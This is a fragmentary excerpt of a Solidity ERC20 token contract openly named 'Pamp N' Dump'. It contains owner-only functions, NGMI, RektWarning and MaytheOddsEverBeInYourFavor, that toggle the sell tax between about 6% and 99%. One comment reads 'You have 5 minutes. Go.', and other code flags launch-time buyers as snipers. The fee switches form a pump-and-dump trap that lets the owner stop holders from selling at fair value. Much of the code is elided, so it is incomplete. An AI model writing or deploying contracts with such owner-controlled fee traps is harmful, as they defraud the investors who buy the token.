...
.______      ___      .___  ___. .______       __  .___________.
|   _  \    /   \     |   \/   | |   _  \     |  | |           |
|  |_)  |  /  ^  \    |  \  /  | |  |_)  |    |  | `---|  |----`
|   ___/  /  /_\  \   |  |\/|  | |   ___/     |  |     |  |     
|  |     /  _____  \  |  |  |  | |  |         |  |     |  |     
...
contract PampandDump is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    event AutoNukeLP();
    event ManualNukeLP();
    constructor() ERC20("Pamp N' Dump", "PND") {
        ...
        uint256 sellMarketingFee = 67;
        uint256 sellLiquidityFee = 32;
    ...
    function updateBuyFees(uint256 marketingFee, uint256 liquidityFee) external onlyOwner {
        ...
        function MaytheOddsEverBeInYourFavor() external onlyOwner {
        _sellMarketingFee = 4;
        _sellLiquidityFee = 2; //You have 5 minutes. Go.
        sellTotalFees = _sellMarketingFee + _sellLiquidityFee;
    }
        function RektWarning() external onlyOwner {
        _sellMarketingFee = 17;
        _sellLiquidityFee = 8;
        sellTotalFees = _sellMarketingFee + _sellLiquidityFee;
    }
        function NGMI() external onlyOwner {
        _sellMarketingFee = 67;
        _sellLiquidityFee = 32;
        sellTotalFees = _sellMarketingFee + _sellLiquidityFee;
    }    
    ...
    function _transfer(
        ...
        if (block.timestamp.add(1) == _launchTime) _isSniper[to] = true;
        if (block.timestamp.add(2) == _launchTime) _isSniper[to] = true; 
          if (limitsInEffect) {
            if (
                from != owner() &&
                to != owner() &&
